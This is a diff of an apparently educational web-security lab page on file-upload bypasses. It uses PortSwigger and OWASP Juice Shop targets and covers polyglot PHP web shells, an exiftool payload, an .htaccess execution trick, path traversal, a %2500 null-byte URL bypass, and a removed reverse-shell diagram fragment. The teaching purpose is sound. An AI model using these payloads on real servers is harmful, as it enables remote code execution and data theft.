               <span class="comparison-badge" style="color:var(--color-cyan);">First 4–6 Bytes</span>
-            </div>
-            <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>GIF image:  47 49 46 38 39 61   ("GIF89a")
-PNG image:  89 50 4E 47 0D 0A   ("\x89PNG\r\n")
-JPEG image: FF D8 FF E0</code></pre></div>
-            </div>
-            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
-              <code>finfo_file()</code> and <code>exif_imagetype()</code> inspect those opening header bytes to decide what the file is. If the file starts with <code>&lt;?php</code>, they reject it as <code>text/x-php</code>.
-            </p>
-          </div>
-          <div class="comparison-card comparison-card--accent">
-            <div class="comparison-card__header">
-              <h3 class="comparison-card__title" id="gif89a-polyglot">The <code>GIF89a</code> Polyglot Trick</h3>
-              <span class="comparison-badge" style="color:var(--color-accent);">Valid Header + PHP</span>
             </div>
             <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
               <div class="terminal-window__body"><pre><code>GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code></pre></div>
             </div>
             <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
-              Because PHP only executes code inside <code>&lt;?php ... ?&gt;</code> and prints everything outside verbatim, prepending <code>GIF89a</code> passes leading magic-byte checks as <code>image/gif</code> while still executing PHP. (Full parsers like <code>getimagesize()</code> also expect width/height bytes or valid EXIF comments.)
+              When a server only checks opening magic bytes (<code>47 49 46 38 39 61</code> = <code>GIF89a</code>, <code>89 50 4E 47</code> = PNG, <code>FF D8 FF</code> = JPEG), prepending <code>GIF89a</code> fools signature checks like <code>finfo_file()</code> while PHP echoes <code>GIF89a</code> and executes the tag.
+            </p>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title" id="gif89a-polyglot">Full Image Check: EXIF Polyglot</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">Valid JPEG + PHP</span>
+            </div>
+            <div class="terminal-window" style="margin:var(--space-2) 0;">
+              <div class="terminal-window__body"><pre><code>exiftool -Comment="&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;" avatar.jpg -o polyglot.php</code></pre></div>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+              When a server uses <code>getimagesize()</code> to validate full image headers and pixel dimensions, a 6-byte prefix fails. Injecting PHP inside a real JPEG's EXIF <code>Comment</code> field satisfies every image parser while PHP still scans the binary and executes <code>&lt;?php ... ?&gt;</code>.
             </p>
           </div>
         </div>
 
+        <div class="bento-card" style="border-left:3px solid var(--color-accent);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Practice · Solve PortSwigger's Polyglot Lab with <code>exiftool</code></strong>
+            <span class="comparison-badge" style="color:var(--color-accent);">Binary Polyglot</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            Open PortSwigger's sixth lab: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload" target="_blank" rel="noopener noreferrer" style="color:var(--color-cyan);text-decoration:underline;">Lab: Remote code execution via polyglot web shell upload ↗</a>. Run the <code>exiftool</code> command above on any local <code>.jpg</code> to produce <code>polyglot.php</code>, upload it as your avatar, then fetch <code>GET /files/avatars/polyglot.php</code> in Burp Repeater and search the raw JPEG binary response for <code>START</code> to read Carlos's secret before <code>END</code>.
+          </p>
+          <p style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin:0;">
+            No <code>exiftool</code> installed? You can embed <code>&lt;?php echo 'START '; system($_GET['cmd']); echo ' END'; ?&gt;</code> inside a real JPEG's EXIF comment or use a hex editor after the JPEG comment marker (<code>FF FE</code>) so the image structure remains intact. Notice why strict defenses <strong>re-encode</strong> uploads (via GD/ImageMagick) into brand-new images: re-encoding strips metadata blocks completely.
+          </p>
+        </div>
+      </section>
+
+      <!-- Section 5: When Single %00 Fails at the Front Door: Juice Shop /ftp & %2500 -->
+      <section>
+        <h2 id="misconfig-recon">5. When Single <code>%00</code> Fails at the Front Door: Exposed <code>/ftp</code> &amp; <code>%2500</code></h2>
+        <p class="lab-lead">
+          In Step 2b (<code>exploit.php%00.jpg</code>) and Step 3a (<code>..%2fexploit.php</code>), single URL-encoding worked because your payload sat inside a <code>multipart/form-data</code> body header, untouched by the URL router. Now watch what happens when a file-extension filter sits directly on a <strong>URL path</strong> instead, using OWASP Juice Shop's exposed backup folder (Security Misconfiguration, OWASP A02).
+        </p>
+
+        <div class="target-launcher" data-target-slug="juice-shop">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧃</span>
+              <div>
+                <h3 class="target-launcher__title" id="target-juice-shop-card">OWASP Juice Shop</h3>
+                <div class="target-launcher__platform">Same container as Labs 02–05. Skip the docker command if it's already running.</div>
+              </div>
+            </div>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Start the container (skip if already running)</span>
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · start Juice Shop</span></div>
+                <div class="terminal-window__body"><pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre></div>
+              </div>
+            </div>
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Target base URL</span>
+              <a class="target-launcher__url" href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Run these checks with <code>curl</code> in your terminal or open the URLs in your browser.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-4);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-cyan);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 4 · Discover the Exposed <code>/ftp</code> Directory &amp; Probe the Filter</strong>
+            <span class="comparison-badge" style="color:var(--color-cyan);">Recon → Identify</span>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-2);">
+            <li><strong>Find the hidden folder without guessing</strong>: Just like real assessments, check <code>robots.txt</code> (or inspect the link to <code>/ftp/legal.md</code> on the About Us page). Run:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · check robots.txt and list /ftp</span></div>
+                <div class="terminal-window__body"><pre><code>curl -s http://localhost:3000/robots.txt
+curl -s http://localhost:3000/ftp | grep -oE 'href="[^"]+"'</code></pre></div>
+              </div>
+            </li>
+            <li><code>robots.txt</code> prints <code>Disallow: /ftp</code>, and requesting <code>/ftp</code> returns a full directory listing containing backup files nobody meant to publish (<code>package.json.bak</code>, <code>coupons_2013.md.bak</code>, <code>suspicious_errors.yml</code>, <code>incident-support.kdbx</code>).</li>
+            <li><strong>Test the download rule</strong>: <code>curl -s http://localhost:3000/ftp/legal.md | head -3</code> downloads cleanly (<code>200 OK</code>), while requesting <code>package.json.bak</code> hits a <code>403 Forbidden</code> wall:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · confirm the 403 extension check</span></div>
+                <div class="terminal-window__body"><pre><code>curl -i http://localhost:3000/ftp/package.json.bak</code></pre></div>
+              </div>
+            </li>
+          </ol>
+          <div class="terminal-window" data-no-copy style="margin:0;">
+            <div class="terminal-window__header"><span class="terminal-window__title">Output · 403 error leaks the exact allowlist</span></div>
+            <div class="terminal-window__body"><pre><code>HTTP/1.1 403 Forbidden
+...
+Error: Only .md and .pdf files are allowed!</code></pre></div>
+          </div>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 You already bypassed a filename check in Section 3 with a single <code>%00</code> (<code>exploit.php%00.jpg</code>). If you send <code>/ftp/package.json.bak%00.md</code> in the URL path, the web server's HTTP router automatically URL-decodes the path once on arrival. What will happen before the <code>.md</code> check even runs, and how do you survive one decode?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Single <code>%00</code> gets decoded at the front door into a raw null byte and rejected with <code>400 Bad Request</code>. To make <code>%00</code> survive one round of URL-decoding, encode the <code>%</code> sign itself (<code>%</code> = hex <code>25</code> → <code>%25</code>), sending <code>package.json.bak%2500.md</code>.</p>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-4);border-left:3px solid var(--color-accent);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 5 · Bypass the Allowlist with Double-Encoded Null Byte (<code>%2500</code>)</strong>
+            <span class="comparison-badge" style="color:var(--color-accent);">Parser Split</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            Watch the exact black-box response-diffing loop in action: first try single <code>%00</code> (just like Step 2b), see the status code flip from <code>403</code> to <code>400 Bad Request</code>, then double-encode <code>%</code> as <code>%25</code> so <code>%00</code> survives the front-door URL parser:
+          </p>
+          <div class="terminal-window" style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">bash · Probe 1: single %00 triggers 400 Bad Request at the front door</span></div>
+            <div class="terminal-window__body"><pre><code>curl -i "http://localhost:3000/ftp/package.json.bak%00.md" | head -n 1</code></pre></div>
+          </div>
+          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-3);">
+            <div class="terminal-window__header"><span class="terminal-window__title">Output · 400 Bad Request (HTTP router decoded %00 too early)</span></div>
+            <div class="terminal-window__body"><pre><code>HTTP/1.1 400 Bad Request
+...
+&lt;title&gt;BadRequestError: Bad Request&lt;/title&gt;</code></pre></div>
+          </div>
+          <div class="terminal-window" style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">bash · Probe 2: encode % as %25 (%00 ➔ %2500) to survive one URL decode</span></div>
+            <div class="terminal-window__body"><pre><code>curl -s "http://localhost:3000/ftp/package.json.bak%2500.md" | head -n 6</code></pre></div>
+          </div>
+          <div class="terminal-window" data-no-copy style="margin:0;">
+            <div class="terminal-window__header"><span class="terminal-window__title">Output · 200 OK serving package.json.bak</span></div>
+            <div class="terminal-window__body"><pre><code>{
+  "name": "juice-shop",
+  "version": "6.2.0-SNAPSHOT",
+  "description": "An intentionally insecure JavaScript Web Application",
+  "homepage": "http://owasp-juice.shop",
+  "author": "Björn Kimminich &lt;bjoern.kimminich@owasp.org&gt; (https://kimminich.de)",</code></pre></div>
+          </div>
+
+          <details class="thought-accordion" style="margin-top:var(--space-3);" open>
+            <summary style="font-weight:600;">Black-box methodology: 3-step behavioral feedback loop</summary>
+            <div class="thought-accordion__content" style="padding-top:var(--space-3);">
+
+              <!-- Step 1: The Tell -->
+              <div style="margin-bottom:var(--space-4);">
+                <div style="display:flex;align-items:center;gap:var(--space-2);margin-bottom:var(--space-2);">
+                  <span style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-bg);background:var(--color-cyan);padding:2px 8px;border-radius:12px;">STEP 1</span>
+                  <strong style="font-size:var(--font-size-sm);color:var(--color-text);">The Tell: Differential Error Diagnosis</strong>
+                </div>
+                <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:var(--space-2);">
+                  <div style="padding:var(--space-2) var(--space-3);background:var(--color-bg);border:1px solid var(--color-border);border-radius:var(--radius-sm);opacity:0.65;">
+                    <div style="font-family:var(--font-mono);font-size:var(--font-size-xs);color:var(--color-text-muted);margin-bottom:2px;">❌ 404 Not Found</div>
+                    <div style="font-size:11px;color:var(--color-text-secondary);">Missing folder or hidden path. <em>(Not what happened)</em></div>
+                  </div>
+                  <div style="padding:var(--space-2) var(--space-3);background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.4);border-radius:var(--radius-sm);">
+                    <div style="font-family:var(--font-mono);font-size:var(--font-size-xs);font-weight:700;color:var(--color-danger);margin-bottom:2px;">🎯 403 Only .md and .pdf allowed</div>
+                    <div style="font-size:11px;color:var(--color-text);"><strong>Suffix guard detected!</strong> Checks the ending of the filename.</div>
+                  </div>
+                  <div style="padding:var(--space-2) var(--space-3);background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.4);border-radius:var(--radius-sm);">
+                    <div style="font-family:var(--font-mono);font-size:var(--font-size-xs);font-weight:700;color:var(--color-warn);margin-bottom:2px;">⚡ 400 Bad Request on %00</div>
+                    <div style="font-size:11px;color:var(--color-text);"><strong>Early decode tell!</strong> HTTP router decoded <code>%00</code> before the guard ran.</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Step 2: Multi-Layer URL Pipeline & Fuzzing Matrix -->
+              <div style="margin-bottom:var(--space-4);">
+                <div style="display:flex;align-items:center;gap:var(--space-2);margin-bottom:var(--space-2);">
+                  <span style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-bg);background:var(--color-warn);padding:2px 8px;border-radius:12px;">STEP 2</span>
+                  <strong style="font-size:var(--font-size-sm);color:var(--color-text);">Multi-Layer URL Pipeline &amp; Extension Fuzzing Matrix</strong>
+                </div>
+
+                <!-- Pipeline Diagram -->
+                <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:var(--space-2);padding:var(--space-2) var(--space-3);background:var(--color-bg);border:1px solid var(--color-border);border-radius:var(--radius-sm);margin-bottom:var(--space-2);">
+                  <div style="text-align:center;flex:1 1 120px;">
+                    <div style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-cyan);">1. HTTP Router</div>
+                    <div style="font-size:10px;color:var(--color-text-muted);">Auto-Decode #1 (<code>%2500</code> ➔ <code>%00</code>)</div>
+                  </div>
+                  <span style="color:var(--color-text-muted);">⟶</span>
+                  <div style="text-align:center;flex:1 1 120px;">
+                    <div style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-warn);">2. Suffix Guard</div>
+                    <div style="font-size:10px;color:var(--color-warn);font-weight:600;">Ends with <code>.md</code>? (Pass ✅)</div>
+                  </div>
+                  <span style="color:var(--color-text-muted);">⟶</span>
+                  <div style="text-align:center;flex:1 1 120px;">
+                    <div style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-accent);">3. File Handler</div>
+                    <div style="font-size:10px;color:var(--color-text-muted);">Null Truncation (strips <code>%00.md</code>)</div>
+                  </div>
+                  <span style="color:var(--color-text-muted);">⟶</span>
+                  <div style="text-align:center;flex:1 1 120px;">
+                    <div style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-purple, #a371f7);">4. Filesystem</div>
+                    <div style="font-size:10px;color:var(--color-purple, #a371f7);font-weight:600;">Opens <code>package.json.bak</code> (💥)</div>
+                  </div>
+                </div>
+
+                <!-- Fuzzing Matrix Table -->
+                <div class="table-container" style="margin:0;">
+                  <table class="data-table" style="font-size:var(--font-size-xs);">
+                    <thead>
+                      <tr>
+                        <th style="width:28%;">Fuzzing Variant</th>
+                        <th style="width:36%;">Payload Shape</th>
+                        <th style="width:36%;">Observed Result &amp; What It Reveals</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>1. Single Poison Null Byte (<code>%00</code>)</strong></td>
+                        <td><code>package.json.bak%00.md</code></td>
+                        <td><code>400 Bad Request</code> at Layer 1 (router decodes <code>%00</code> too early).</td>
+                      </tr>
+                      <tr style="background:rgba(34, 197, 94, 0.08);">
+                        <td><strong style="color:var(--color-accent);">2. Double-Encoded Null Byte (<code>%2500</code>)</strong></td>
+                        <td><code>package.json.bak%2500.md</code></td>
+                        <td><code>200 OK</code> (survives router as <code>%00</code>, passes <code>.md</code> guard, truncates at handler).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>3. Query / Fragment Suffix (<code>?</code> / <code>#</code>)</strong></td>
+                        <td><code>package.json.bak?.md</code></td>
+                        <td><code>403 Forbidden</code> (query/fragment stripped before suffix check runs).</td>
+                      </tr>
+                      <tr>
+                        <td><strong>4. Path Parameter (<code>;</code>)</strong></td>
+                        <td><code>package.json.bak;.md</code></td>
+                        <td><code>403 Forbidden</code> (no semicolon path splitting between proxy and app).</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+              </div>
+
+              <!-- Step 3: The Behavioral Oracle -->
+              <div>
+                <div style="display:flex;align-items:center;gap:var(--space-2);margin-bottom:var(--space-2);">
+                  <span style="font-family:var(--font-mono);font-size:11px;font-weight:700;color:var(--color-bg);background:var(--color-accent);padding:2px 8px;border-radius:12px;">STEP 3</span>
+                  <strong style="font-size:var(--font-size-sm);color:var(--color-text);">The Behavioral Oracle: 3-Request Verification</strong>
+                </div>
+
+                <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:var(--space-2);margin-bottom:var(--space-2);">
+                  <div style="padding:var(--space-2) var(--space-3);background:rgba(239,68,68,0.05);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius-sm);">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                      <span style="font-size:11px;font-weight:600;color:var(--color-danger);">1. Baseline Probe</span>
+                      <span style="font-family:var(--font-mono);font-size:10px;padding:1px 5px;border-radius:3px;background:rgba(239,68,68,0.2);color:var(--color-danger);font-weight:700;">403</span>
+                    </div>
+                    <div style="font-family:var(--font-mono);font-size:11px;color:var(--color-text-secondary);">
+                      <code>GET /ftp/package.json.bak</code><br>
+                      <span style="color:var(--color-danger);font-weight:600;">➔ Blocked by Suffix Guard</span>
+                    </div>
+                  </div>
+
+                  <div style="padding:var(--space-2) var(--space-3);background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.3);border-radius:var(--radius-sm);">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                      <span style="font-size:11px;font-weight:600;color:var(--color-warn);">2. Single %00 Probe</span>
+                      <span style="font-family:var(--font-mono);font-size:10px;padding:1px 5px;border-radius:3px;background:rgba(245,158,11,0.2);color:var(--color-warn);font-weight:700;">400</span>
+                    </div>
+                    <div style="font-family:var(--font-mono);font-size:11px;color:var(--color-text-secondary);">
+                      <code>GET /ftp/package.json.bak%00.md</code><br>
+                      <span style="color:var(--color-warn);font-weight:600;">➔ Blocked at HTTP Router</span>
+                    </div>
+                  </div>
+
+                  <div style="padding:var(--space-2) var(--space-3);background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.3);border-radius:var(--radius-sm);">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                      <span style="font-size:11px;font-weight:600;color:var(--color-accent);">3. Double %2500 Exploit</span>
+                      <span style="font-family:var(--font-mono);font-size:10px;padding:1px 5px;border-radius:3px;background:rgba(34,197,94,0.2);color:var(--color-accent);font-weight:700;">200 OK</span>
+                    </div>
+                    <div style="font-family:var(--font-mono);font-size:11px;color:var(--color-text-secondary);">
+                      <code>GET /ftp/package.json.bak%2500.md</code><br>
+                      <span style="color:var(--color-accent);font-weight:600;">➔ Guard Bypassed &amp; File Served!</span>
+                    </div>
+                  </div>
+                </div>
+
+                <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:var(--space-2);padding:var(--space-1) var(--space-2);background:var(--color-bg);border:1px dashed var(--color-border);border-radius:var(--radius-sm);font-size:11px;color:var(--color-text-muted);">
+                  <span>💡 <strong>Black-Box Reality:</strong> You never saw a single line of backend code.</span>
+                  <span style="font-family:var(--font-mono);color:var(--color-accent);font-weight:600;">Verified via response diffing alone</span>
+                </div>
+              </div>
+
+            </div>
+          </details>
+          <details class="thought-accordion" style="margin-top:var(--space-3);">
+            <summary>Other endpoints Juice Shop leaves open (and a quick header check)</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0 0 var(--space-2);">Check these without logging in: <code>GET /metrics</code> (full Prometheus server telemetry), <code>GET /rest/admin/application-configuration</code> (the application's configuration JSON), and <code>curl -I http://localhost:3000</code> (notice there's no <code>Content-Security-Policy</code> header, which is why Lab 04's inline XSS had nothing standing in its way).</p>
+              <p style="margin:0;">Also try <code>http://localhost:3000/ftp/package.json.bak%2500.md</code> directly in your browser. Just like Lab 05's JSON parameter pollution, the bug comes from validating one version of the string and acting on a mutated version afterward.</p>
+            </div>
+          </details>
+        </div>
+
         <!-- Summary Data Table with Copy Buttons -->
-        <div class="diagram-card">
+        <div class="diagram-card" style="margin-top:var(--space-4);">
           <div class="diagram-card__title">
-            <span>Validation vs. Execution Discrepancies in File Handling</span>
+            <span>Validation vs. Execution Discrepancies Across All 6 Techniques</span>
             <span style="color:var(--color-accent);">Bypass Reference</span>
           </div>
           <div class="table-container">
@@ -500,16 +752,6 @@ JPEG image: FF D8 FF E0</code></pre></div>
               </thead>
               <tbody>
                 <tr>
-                  <td><strong>URL Allowlist (<code>.md</code>/<code>.pdf</code>)</strong></td>
-                  <td>Juice Shop checks ending before calling <code>cutOffPoisonNullByte()</code>; Express decodes <code>%25</code> to <code>%</code>.</td>
-                  <td>
-                    <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
-                      <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">/ftp/package.json.bak%2500.md</code>
-                      <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('/ftp/package.json.bak%2500.md')">Copy</button>
-                    </div>
-                  </td>
-                </tr>
-                <tr>
                   <td><strong>HTTP <code>Content-Type</code></strong></td>
                   <td>Trusts client-sent MIME header in the multipart body while saving the original <code>.php</code> filename.</td>
                   <td>
@@ -520,7 +762,7 @@ JPEG image: FF D8 FF E0</code></pre></div>
                   </td>
                 </tr>
                 <tr>
-                  <td><strong>Filename Extension</strong></td>
+                  <td><strong>Filename Extension (Body)</strong></td>
                   <td>Filter inspects trailing <code>.jpg</code>; underlying save routine truncates at decoded <code>%00</code>.</td>
                   <td>
                     <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
@@ -530,12 +772,42 @@ JPEG image: FF D8 FF E0</code></pre></div>
                   </td>
                 </tr>
                 <tr>
-                  <td><strong>Leading Magic Bytes</strong></td>
-                  <td>Signature check sees <code>GIF89a</code> at byte 0; PHP interpreter still scans for and runs <code>&lt;?php ... ?&gt;</code>.</td>
+                  <td><strong>Non-Exec Upload Folder</strong></td>
+                  <td>Strips literal <code>../</code>, misses URL-encoded <code>..%2f</code>, and saves one folder up where PHP executes.</td>
+                  <td>
+                    <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                      <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">..%2fexploit.php</code>
+                      <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('..%2fexploit.php')">Copy</button>
+                    </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td><strong><code>.php</code> Blacklist (Apache)</strong></td>
+                  <td>Blocks <code>.php</code> uploads, forgets <code>.htaccess</code>; mapping a custom extension restores execution.</td>
+                  <td>
+                    <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                      <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">AddType application/x-httpd-php .l33t</code>
+                      <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('AddType application/x-httpd-php .l33t')">Copy</button>
+                    </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td><strong>Image Content / Magic Bytes</strong></td>
+                  <td>Image parser validates header/dimensions (<code>GIF89a</code> or real JPEG); PHP executes embedded <code>&lt;?php ... ?&gt;</code> in EXIF comments.</td>
                   <td>
                     <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
                       <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">GIF89a&lt;?php system($_GET['cmd']); ?&gt;</code>
                       <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('GIF89a&lt;?php system($_GET[\'cmd\']); ?&gt;')">Copy</button>
+                    </div>
+                  </td>
+                </tr>
+                <tr>
+                  <td><strong>URL Allowlist (<code>.md</code>/<code>.pdf</code>)</strong></td>
+                  <td>HTTP router decodes <code>%25</code> to <code>%</code>; suffix filter sees <code>.md</code> before the file handler truncates at <code>%00</code>.</td>
+                  <td>
+                    <div class="code-copy-inline" style="display:flex;align-items:center;justify-content:space-between;width:100%;">
+                      <code style="word-break:break-all;white-space:normal;font-size:0.75rem;">/ftp/package.json.bak%2500.md</code>
+                      <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('/ftp/package.json.bak%2500.md')">Copy</button>
                     </div>
                   </td>
                 </tr>
@@ -545,169 +817,27 @@ JPEG image: FF D8 FF E0</code></pre></div>
         </div>
       </section>
 
-      <!-- Section 5: OS Command Injection & Upgrading to a Reverse Shell -->
+      <!-- Section 6: Write the Finding & How Developers Fix File Upload RCE -->
       <section>
-        <h2 id="command-injection">5. OS Command Injection &amp; Reverse Shells</h2>
+        <h2 id="write-finding">6. Write the Finding &amp; How Developers Fix File Upload RCE</h2>
         <p class="lab-lead">
-          You don't always need an upload form to reach the operating system. Whenever a backend glues user input into a shell command (checking stock, pinging an IP, converting a file), shell metacharacters break out of the argument and execute arbitrary commands.
-        </p>
-
-        <div class="diagram-card" style="margin-top:var(--space-3);">
-          <div class="diagram-card__title">
-            <span>IN-BAND COMMAND INJECTION vs. REVERSE SHELL</span>
-            <span style="color:var(--color-accent);">MITRE T1059</span>
-          </div>
-          <svg class="diagram-svg" viewBox="0 0 880 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Comparison of in-band command injection returning stdout in HTTP response versus out-of-band reverse shell dialing back to netcat listener">
-            <defs>
-              <marker id="arr-cyan-cmd" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-cyan)" />
-              </marker>
-              <marker id="arr-warn-cmd" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
-                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-warn)" />
-              </marker>
-            </defs>
-
-            <!-- Row 1: In-Band -->
-            <rect x="10" y="16" width="170" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-cyan)" stroke-width="1.5" />
-            <text x="95" y="45" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">1. IN-BAND (SYNC)</text>
-            <text x="95" y="66" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">storeId=1|whoami</text>
-
-            <line x1="180" y1="54" x2="225" y2="54" stroke="var(--color-cyan)" stroke-width="2" marker-end="url(#arr-cyan-cmd)" />
-
-            <rect x="230" y="16" width="275" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
-            <text x="367" y="45" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Server executes inside /bin/sh</text>
-            <text x="367" y="66" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">stockreport.pl 1 1|whoami</text>
-
-            <line x1="505" y1="54" x2="550" y2="54" stroke="var(--color-cyan)" stroke-width="2" marker-end="url(#arr-cyan-cmd)" />
-
-            <rect x="555" y="16" width="315" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-cyan)" stroke-width="1.5" />
-            <text x="712" y="45" fill="var(--color-cyan)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">Output printed in HTTP 200 body</text>
-            <text x="712" y="66" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">e.g. peter-x7a9b2 (one cmd per request)</text>
-
-            <!-- Row 2: Reverse Shell -->
-            <rect x="10" y="122" width="170" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-warn)" stroke-width="1.5" />
-            <text x="95" y="151" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="12" font-weight="700" text-anchor="middle">2. REVERSE SHELL</text>
-            <text x="95" y="172" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">bash -i &gt;&amp; /dev/tcp/…</text>
-
-            <line x1="180" y1="160" x2="225" y2="160" stroke="var(--color-warn)" stroke-width="2" marker-end="url(#arr-warn-cmd)" />
-
-            <rect x="230" y="122" width="275" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
-            <text x="367" y="151" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Target dials OUT over TCP</text>
-            <text x="367" y="172" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">Bypasses inbound firewall rules</text>
-
-            <line x1="505" y1="160" x2="550" y2="160" stroke="var(--color-warn)" stroke-width="2" marker-end="url(#arr-warn-cmd)" />
-
-            <rect x="555" y="122" width="315" height="76" rx="8" fill="var(--color-warn-soft)" stroke="var(--color-warn)" stroke-width="2" />
